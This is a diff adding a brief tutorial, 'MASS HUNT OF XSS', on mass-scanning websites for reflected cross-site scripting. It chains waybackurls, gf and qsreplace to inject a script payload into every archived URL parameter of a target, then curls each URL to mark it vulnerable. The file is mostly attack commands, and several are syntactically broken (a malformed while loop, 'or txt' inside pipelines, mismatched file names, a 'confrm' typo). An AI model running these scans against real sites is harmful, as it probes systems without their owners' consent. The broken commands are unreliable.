@@ -1,0 +1,32 @@
+MASS HUNT OF XSS
+
+1. Install GF tool by tomnomnom
+2. Clone the repo
+3. go run main.go
+4. cp main.go /usr/local/bin
+5. Install gf in root
+6. Install qsreplace tool
+Usage:
+Get more gf patterns from 1ndian1333t
+----
+$ waybackurls target.com 
+$ cat url.txt
+$ cat url.txt | gf xss 
+$ cat url.txt | gf xss | qsreplace FUZZ
+$ cat url.txt | gf xss | qsreplace '<script>confrm(1)</script>'
+$ Now need to check the each url was working or not so manually it was not possible so we use CURL for this..
+
+$ cat test.txt | gf xss | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json or txt && cat combinefuzz.json or txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerab;e\n";done
+
+-----
+32 and 31m were the colors coding. So see the color code in google like terminal command line color codes
+ note : remove ---> | gf xss | to get more results than using gf xss 
+
+To get more result use this one
+$ waybackurls target.com | tee targetresult.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tiff|png|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.txt or .json && cat combinedfuzz.txt or .json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+
+
+iv = remove 
+
+NOTE: Do not use gf patterns as you get less results...
+Thank you....
